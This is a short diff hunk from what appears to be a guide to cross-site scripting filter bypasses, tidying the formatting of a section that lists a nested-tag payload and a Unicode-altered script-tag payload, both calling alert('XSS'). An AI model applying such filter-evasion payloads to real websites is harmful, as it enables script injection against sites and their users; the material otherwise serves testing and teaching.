@@ -146,10 +146,7 @@ Some websites may block basic payloads. Try bypass techniques:
 Bypass Tags:
         <<script>alert('XSS');</script>
 Using Unicode Encoding:
-
-html
-Copy code
-<scrİpt>alert('XSS')</scrİpt>
+        <scrİpt>alert('XSS')</scrİpt>
 Using Obfuscation:
 
 html
